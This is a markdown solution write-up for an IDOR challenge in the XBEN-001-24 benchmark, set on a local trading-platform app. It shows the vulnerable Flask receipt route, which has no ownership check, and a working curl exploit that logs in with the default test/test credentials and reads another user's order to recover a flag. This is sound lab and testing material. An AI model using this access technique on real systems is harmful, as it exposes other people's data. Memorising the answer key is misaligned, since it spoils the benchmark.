# XBEN-001-24 — IDOR - Trading Platform - Authorization

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Insecure Direct Object Reference (IDOR) — `/order/<id>/receipt` fetches any order by ID with no ownership check, combined with default credentials (`test`/`test`).

## Setup

```bash
cd xbow/benchmarks/XBEN-001-24
make run
docker compose port idor_broken_authz_trading_platform-1 80   # -> host port, e.g. 62165
```

## Root cause (app/website/app/routes.py)

```python
@app.route('/order/<int:order_id>/receipt')
def order_receipt(order_id):
    user_id = session.get('user_id')
    if user_id:
        order = Order.query.get(order_id)   # <-- no check that order belongs to user
        return render_template('receipt.html', order=order)
```

## Exploit (copy-pasteable, port substituted for this run: 62165)

```bash
PORT=62165
BASE=http://localhost:$PORT
jar=/tmp/xben001_cookies.txt
rm -f $jar

# Log in with default creds test/test (two-step login: username then password)
curl -s -c $jar -d "username=test" $BASE/ -o /dev/null -L
curl -s -c $jar -b $jar -d "password=test" $BASE/password/test -o /dev/null -L

# Legitimate orders belong to 'test' (300123, 300214, 300327, 300481 per /orders).
# Fuzz a nearby/unauthorized order ID that is NOT in the user's own list:
curl -s -b $jar $BASE/order/300401/receipt | grep -A2 -B2 -i flag
```
